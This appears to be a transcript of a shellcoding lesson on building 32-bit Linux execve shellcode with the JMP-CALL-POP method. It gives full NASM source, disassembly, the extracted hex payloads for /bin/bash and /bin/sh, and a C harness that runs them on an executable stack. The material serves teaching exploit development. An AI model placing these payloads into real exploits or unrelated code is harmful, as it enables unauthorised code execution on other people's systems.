#Execve Shellcode JMP-CALL-POP Method

Hello students! In this video we will look at how to create an execve
shellcode using the JMP-CALL-POP method.

Now, before we really move on to the actual shellcoding the question
arises what is `execve`? As you can imagine a lot of times when we
create a shellcode you would want to execute some other program from
within your shellcode. 

So you would want to locally get access to a shell prompt or even
remotely be able to access a shell prompt as the most simple example.
Which means there has to be some way our shellcode can execute the
shell program on the system which would be `/bin/bash` or `/bin/sh`
or whatever is available.

Now, what it's really means again is that we need to **find a syscall**
which can allow us to execute a program from the our shellcode. That
syscall is `execve`. You can actually go to your system and do 

```
$ man execve

EXECVE(2)           Linux Programmer's Manual           EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

And you would find a `man` page. Very simply `execve` takes three
arguments. The first argument is basically the **program** which you
want to execute, and this is an absolute path as an example `/bin/sh`.
The second `argv` is actually an array of argument strings passed to
the new program.

So in the simplest form if you want to execute `/bin/bash` without any
other arguments then `filename` would point to `/bin/bash` string in
memory, while `argv` the first element would actually be the address
of `/bin/bash` in memory, and the second element would just be NULL
or 4 zeros. Now, the third argument is `envp` which is nothing but
an array of strings which you can pass as an additional environment 
to the program before it is executed. Now, typically we don't need 
`envp` too and `envp` can be pretty much NULL which is all zeros or 
a dword zero.

Going back to the slide, what does this mean? `filename` is pointing
to `/bin/bash,0x0` and according to the syscall convention this need
to be inside the `ebx` register, `argv` contains basically two elements
the first is the address of `/bin/bash` in memory just identical 
basically to pointer `filename` and the second is nothing but NULL
which is `0x00000000`, this entire structure address would be in `ecx`
register. Finally, `envp` contains the address which points to NULL
ones again and this would be in `edx` register.

Now, the most important thing if you notice that there are a ton of
nulls in here which we need to have before we can execute the call
`execve`, unfortunately, your shellcode can not contain NULLs. Which
means we need to work around this restriction.

Now, how are we going to do that? So let me go ahead and write some
code. Let copy `template.nasm` to `execve.nasm`.

```asm
global _start

section .text
_start:

        ; Print hello world using write syscall

        mov eax, 0x4
        mov ebx, 1
        mov ecx, message
        mov edx, mlen
        int 0x80


        mov eax, 1
        mov ebx, 10             ; sys_exit syscall
        int 0x80

section .data

        message: db "Hello World!"
        mlen     equ $-message
```

Let me remove all this stuff which we do not need.

```asm
global _start

section .text
_start:

```

Now, the first thing is we initially take a string which contains the
program we want to execute (`/bin/bash`). And after that we have the
next byte where we have the value `0xA` in it. If you notice this byte
needs to be zero down to make a NULL. So that `/bin/bash` is 
null-terminated as the string. Then after that we are going to have
4 `B`: `BBBB` and then 4 `C`: `CCCC`. I'll come to why and what etc.
in just a bit. Let me define this in memory first.

```asm
global _start

section .text
_start:

        
        

 
 
        message db "/bin/bashABBBBCCCC"
```

Now, the question arises that this string is contain of our shellcode
what it really means is how do we go ahead and find out the address
of the string in our shellcode? And to do this we are going to use
the JMP-CALL-POP technique.

Now, remember in this specific shellcode `eax`,`ebx`,`ecx` and `edx`
all 4 are being used to set up the syscall. Hence we can not use any
of this registers to point to the string. And what we will do is
we will use the `esi` register. So let's now setup JMP-CALL-POP in
such a way that we pop the address of the string above into `esi`
register. 

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

And this should be familiar because we already looked at JMP-CALL-POP
technique.

Now, at this point `esi` contains the address of this specific string
in memory.

```
message db "/bin/bashABBBBCCCC"
```

Now, the second string as you are probably imagining we will have to
zero out `A` so `/bin/bash` becomes null-terminated. So we need to
convert `A` to 0x0. How do you do that? So let's go ahead and first
`xor` register with itself so that we go ahead and get zero inside it.
So let's do `xor ebx, ebx`.

Now, we need to move the value 0x0 which just can be refferenced by 
`bl` into this exact position. Now the offset from the beginning of
`esi` is 9. So basically it is after 9. So we can do 

```
mov byte [esi + 9], bl
```

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

Now, there are two other things we need to set up in memory. The first
is the address of `/bin/bash` null-terminated has to be in memory 
somewhere. Now, currently which register points to `/bin/bash`
null-terminated is `esi`. So `esi` or the value inside `esi` needs
to be stored in memory somewhere. And we are going to overwrite `BBBB`
with the address of `"/bin/bash"` which basically is refferenced by
`esi`.

So I could simply do `mov` and in this case we are moving the address
let's it be a `dword` and what we are moving is `esi`, because `esi`
contains the address of the string `/bin/bash`.

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

Now, if you recall `argv` required that we have two values one
after another. The first is a `dword` containing the address of the
program to be executed or basically the string defining the program
name which is basically what we've done in overwritting `BBBB` with
and the second was a `dword` containing nothing but NULL. So `CCCC`
needs to get overwritten right now with all NULLs. And we can easily 
do this by using the `ebx` register.

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
        mov dword [esi + 14], ebx
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

Now, if you look at the structure

```
		 ---------------------------------------
ESI ---> | /bin/bash | 0x0 | Addr | 0x00000000 |
		 ---------------------------------------
```

and if you compare it with what we require for `execve` you would
notice that we have all elements in there.

Now, `ebx` needs to point to a string in memory which is nothing but
`/bin/bash` null-terminated, which means `ebx` needs to contain the
same value as `esi` because that is already pointing to `/bin/bash`
in memory. So for this we will use `lea` or load effective address.

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
        mov dword [esi + 14], ebx

        lea ebx, [esi]
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

Now, the second thing with `argv` which is basically needs to be 
loaded using `ecx`. Now, if you recall `argv` is nothing but an 
address which points to a structure which contains the address of the
`/bin/bash` and then a NULL. So

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
        mov dword [esi + 14], ebx

        lea ebx, [esi]

        lea ecx, [esi + 10]
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

the last argument `envp` basically needs to be an address which points
to a NULL. And this is stored in `edx` which can easily point to the 
last dword containing NULLs.

So purely by simple arithmetic:

```
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
        mov dword [esi + 14], ebx

        lea ebx, [esi]

        lea ecx, [esi + 10]

        lea edx, [esi + 14]
 
call_shellcode:

        call shellcode 
        message db "/bin/bashABBBBCCCC"
```

Now, of course after this you would basically want to call the syscall
itself so you are going to do `xor eax, eax` and the syscall number
which we should verify on your own for `execve` is `mov al, 0xb`

```asm
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 9], bl
        mov dword [esi + 10], esi
        mov dword [esi + 14], ebx

        lea ebx, [esi]

        lea ecx, [esi + 10]

        lea edx, [esi + 14]

        xor eax, eax
        mov al, 0xb
        int 0x80
 
call_shellcode:

        call shellcode
        message db "/bin/bashABBBBCCCC"
```

Now, the question arises after this do we need `exit` routine?
So if I actually do a `man execve` it says `execve` does not return
on success and the text, data, bss, and stack of the calling process
are overwritten by that of the program loaded. It actually means
in reality if `execve` succeeds really do not need an `exit` syscall
to be there which means we can avoid it.

Let me go ahead and compile and link it.

```
nasm -f elf32 execve.nasm
ld -o execve execve.o
```

Let me use `objdump` to check we basically do not have any NULLs.

```
$ objdump -d execve -M intel

execve:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 1a                	jmp    804807c <call_shellcode>

08048062 <shellcode>:
 8048062:	5e                   	pop    esi
 8048063:	31 db                	xor    ebx,ebx
 8048065:	88 5e 09             	mov    BYTE PTR [esi+0x9],bl
 8048068:	89 76 0a             	mov    DWORD PTR [esi+0xa],esi
 804806b:	89 5e 0e             	mov    DWORD PTR [esi+0xe],ebx
 804806e:	8d 1e                	lea    ebx,[esi]
 8048070:	8d 4e 0a             	lea    ecx,[esi+0xa]
 8048073:	8d 56 0e             	lea    edx,[esi+0xe]
 8048076:	31 c0                	xor    eax,eax
 8048078:	b0 0b                	mov    al,0xb
 804807a:	cd 80                	int    0x80

0804807c <call_shellcode>:
 804807c:	e8 e1 ff ff ff       	call   8048062 <shellcode>

08048081 <message>:
 8048081:	2f                   	das    
 8048082:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
 8048085:	2f                   	das    
 8048086:	62 61 73             	bound  esp,QWORD PTR [ecx+0x73]
 8048089:	68 41 42 42 42       	push   0x42424241
 804808e:	42                   	inc    edx
 804808f:	43                   	inc    ebx
 8048090:	43                   	inc    ebx
 8048091:	43                   	inc    ebx
 8048092:	43                   	inc    ebx
```

Seems to look ok. Let's use our small script to get shellcode and 
insert it into `shellcode.c`

```
$ shellcode-dump.sh execve
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

compile it

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

and run this

```
$ ./shellcode 
Shellcode Length:  51
osboxes@osboxes:/home/osboxes/SLAE-Code/Shellcode/Execve$ 
```

and if you notice right now we have an additional bash from which we
are come in.

```
$ ps
  PID TTY          TIME CMD
 2068 pts/2    00:00:01 bash
 6414 pts/2    00:00:00 bash
 6471 pts/2    00:00:00 ps
```

```
$ exit
$ ps
  PID TTY          TIME CMD
 2068 pts/2    00:00:01 bash
 6472 pts/2    00:00:00 ps
```

Fantastic. We could also play with other shells. Let's do it with 
`/bin/sh`. And we need to fix some addresses.

```asm
global _start

section .text
_start:

        jmp short call_shellcode
        

shellcode: 

        pop esi

        xor ebx, ebx
        mov byte [esi + 7], bl
        mov dword [esi + 8], esi
        mov dword [esi + 12], ebx

        lea ebx, [esi]

        lea ecx, [esi + 8]

        lea edx, [esi + 12]

        xor eax, eax
        mov al, 0xb
        int 0x80
 
call_shellcode:

        call shellcode
        message db "/bin/shABBBBCCCC"
```

Let's compile it extract shellcode and put it in `shellcode.c`

```
$ nasm -f elf32 execve.nasm
$ ld -o execve execve.o
$ shellcode-dump.sh execve
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
```

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
osboxes@osboxes:~/SLAE-Code/Shellcode/Execve$ ./shellcode 
Shellcode Length:  49
$ 
$ ps
  PID TTY          TIME CMD
 2068 pts/2    00:00:01 bash
 6518 pts/2    00:00:00 sh
 6522 pts/2    00:00:00 ps
```

And of course it would work, why not. Try both of these and I leave
analyzing with gdb to you, it is pretty straightforward you would
actually see that everything is getting modified. All you need to 
do is track `/bin/bash/`,`A`,`BBBB`, `CCCC` and see their changes.









